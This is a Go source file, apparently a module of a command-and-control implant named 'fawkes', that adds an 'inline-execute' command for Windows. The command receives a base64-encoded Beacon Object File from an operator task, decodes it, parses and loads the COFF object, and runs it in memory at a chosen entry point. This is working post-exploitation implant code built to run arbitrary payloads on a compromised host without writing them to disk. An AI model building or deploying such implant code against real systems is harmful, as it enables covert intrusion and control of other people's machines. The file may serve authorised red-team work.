//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"

	"github.com/Ne0nd0g/go-coff/coff"
	"fawkes/pkg/structs"
)

// InlineExecuteCommand implements the inline-execute command for BOF/COFF execution
type InlineExecuteCommand struct{}

// Name returns the command name
func (c *InlineExecuteCommand) Name() string {
	return "inline-execute"
}

// Description returns the command description
func (c *InlineExecuteCommand) Description() string {
	return "Execute a Beacon Object File (BOF/COFF) in memory"
}

// InlineExecuteParams represents the parameters for inline-execute
type InlineExecuteParams struct {
	BOFB64     string   `json:"bof_b64"`     // Base64-encoded BOF bytes
	EntryPoint string   `json:"entry_point"` // Entry point function name
	Arguments  []string `json:"arguments"`   // Arguments in format: ["zvalue", "i80"]
}

// Execute executes the inline-execute command
func (c *InlineExecuteCommand) Execute(task structs.Task) structs.CommandResult {
	// Parse parameters
	var params InlineExecuteParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Validate BOF data
	if params.BOFB64 == "" {
		return structs.CommandResult{
			Output:    "Error: No BOF data provided",
			Status:    "error",
			Completed: true,
		}
	}

	// Decode the base64-encoded BOF
	bofBytes, err := base64.StdEncoding.DecodeString(params.BOFB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding BOF data: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(bofBytes) == 0 {
		return structs.CommandResult{
			Output:    "Error: BOF data is empty",
			Status:    "error",
			Completed: true,
		}
	}

	// Parse the COFF object
	object, err := coff.ParseObject(bofBytes)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing COFF object: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Load the COFF object (process relocations)
	if err := object.Load(); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error loading COFF object: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Execute the BOF
	// go-coff expects arguments in the format: ["zvalue", "i80"]
	// Note: go-coff's BeaconOutput prints directly to stdout
	if err := object.Run(params.EntryPoint, params.Arguments); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error executing BOF: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    "[+] BOF executed successfully. Output printed to stdout (check agent console if running interactively).",
		Status:    "success",
		Completed: true,
	}
}
